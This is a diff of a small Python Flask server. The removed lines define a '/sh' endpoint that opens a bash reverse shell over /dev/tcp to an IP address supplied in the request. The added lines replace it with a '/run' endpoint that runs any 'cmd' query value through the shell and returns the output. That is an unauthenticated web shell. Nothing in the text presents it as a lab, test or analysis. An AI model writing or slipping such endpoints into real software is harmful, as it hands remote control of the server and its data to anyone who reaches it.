@@ -1,5 +1,5 @@
-import subprocess
 from flask import Flask, request
+import subprocess
 
 app = Flask(__name__)
 
@@ -7,16 +7,18 @@ app = Flask(__name__)
 def root_endpoint():
     return 'Server is up'
 
-@app.route('/sh', methods=['GET'])
-def execute_command():
-    ip = request.args.get('ip', '')
-    if not ip:
-        return 'No IP provided'
+@app.route('/run', methods=['GET'])
+def run_command():
+    cmd = request.args.get('cmd', '')
+    if not cmd:
+        return 'No command provided'
 
-    command = f"/bin/bash -i >& /dev/tcp/{ip}/1234 0>&1"
-    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    try:
+        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, encoding="utf-8")
+    except subprocess.CalledProcessError as e:
+        result = f"Error: {e.output}"
     
-    return result.stdout
+    return result
 
 if __name__ == '__main__':
     app.run()
